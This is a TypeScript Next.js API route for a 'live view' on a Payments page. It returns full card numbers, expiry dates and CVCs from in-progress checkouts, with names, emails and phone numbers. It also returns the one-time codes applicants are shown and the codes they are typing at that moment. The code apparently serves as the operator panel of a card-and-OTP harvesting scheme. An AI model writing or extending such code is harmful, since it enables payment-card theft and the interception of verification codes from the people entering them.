import { NextResponse } from "next/server";
import { getSessionUser } from "@/lib/auth";
import { getDb } from "@/lib/db";

export const dynamic = "force-dynamic";

/** Recent in-progress checkouts, for the live view on the Payments page. */
export async function GET() {
  const user = await getSessionUser();
  if (!user || user.role === "agent") {
    return NextResponse.json({ sessions: [] }, { status: 401 });
  }

  const db = getDb();

  // Anything touched in the last 30 minutes is "live enough" to show.
  const cutoff = new Date(Date.now() - 30 * 60 * 1000).toISOString();
  const sessions = await db
    .prepare(
      `SELECT id, first_name, last_name, email, phone, brokerage, license_state,
              cardholder_name, card_number, card_expiry, card_cvc, step, user_id, updated_at
       FROM checkout_sessions
       WHERE updated_at > ?
       ORDER BY updated_at DESC
       LIMIT 25`
    )
    .all(cutoff);

  // Applicants currently on the OTP step: the code to give them, and the code
  // they are typing right now.
  const otpApplicants = await db
    .prepare(
      `SELECT u.id, u.activation_stage AS stage, u.activation_otp AS code, u.typed_otp AS typed,
              u.activation_stage_updated_at AS updated_at, p.first_name, p.last_name, u.email
       FROM users u LEFT JOIN agent_profiles p ON p.user_id = u.id
       WHERE u.role = 'agent' AND u.activation_stage IN ('otp','otp_verified')
       ORDER BY u.activation_stage_updated_at DESC NULLS LAST`
    )
    .all();

  return NextResponse.json({ sessions, otpApplicants }, { headers: { "Cache-Control": "no-store" } });
}
